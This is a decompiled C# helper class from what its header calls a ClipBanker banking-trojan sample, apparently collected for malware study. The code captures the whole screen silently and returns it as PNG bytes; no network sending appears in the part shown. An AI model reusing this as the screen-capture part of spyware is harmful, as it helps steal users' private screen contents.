// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Helpers.DisplayHelper
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace FtpClient.Data.Helpers
{
  public static class DisplayHelper
  {
    [DllImport("gdi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetDeviceCaps(IntPtr hDC, int nIndex);

    public static double GetWindowsScreenScalingFactor(bool percentage = true)
    {
      Graphics graphics = Graphics.FromHwnd(IntPtr.Zero);
      IntPtr hdc = graphics.GetHdc();
      int deviceCaps = DisplayHelper.GetDeviceCaps(hdc, 10);
      double screenScalingFactor = Math.Round((double) DisplayHelper.GetDeviceCaps(hdc, 117) / (double) deviceCaps, 2);
      if (percentage)
        screenScalingFactor *= 100.0;
      graphics.ReleaseHdc(hdc);
      graphics.Dispose();
      return screenScalingFactor;
    }

    public static Size GetDisplayResolution()
    {
      try
      {
        double screenScalingFactor = DisplayHelper.GetWindowsScreenScalingFactor(false);
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        double width = (double) bounds.Width * screenScalingFactor;
        bounds = Screen.PrimaryScreen.Bounds;
        double height = (double) bounds.Height * screenScalingFactor;
        return new Size((int) width, (int) height);
      }
      catch
      {
        return Screen.PrimaryScreen.Bounds.Size;
      }
    }

    public static byte[] GetScreenshot()
    {
      try
      {
        Size displayResolution = DisplayHelper.GetDisplayResolution();
        Bitmap img = new Bitmap(displayResolution.Width, displayResolution.Height);
        using (Graphics graphics = Graphics.FromImage((Image) img))
        {
          graphics.InterpolationMode = InterpolationMode.Bicubic;
          graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
          graphics.SmoothingMode = SmoothingMode.HighSpeed;
          graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), displayResolution);
        }
        return DisplayHelper.ImageToByte((Image) img);
      }
      catch (Exception ex)
      {
        return (byte[]) null;
      }
    }

    private static byte[] ImageToByte(Image img)
    {
      try
      {
        if (img == null)
          return (byte[]) null;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          img.Save((Stream) memoryStream, ImageFormat.Png);
          return memoryStream.ToArray();
        }
      }
      catch (Exception ex)
      {
        return (byte[]) null;
      }
    }

    public enum DeviceCap
    {
      VERTRES = 10, // 0x0000000A
      DESKTOPVERTRES = 117, // 0x00000075
    }
  }
}
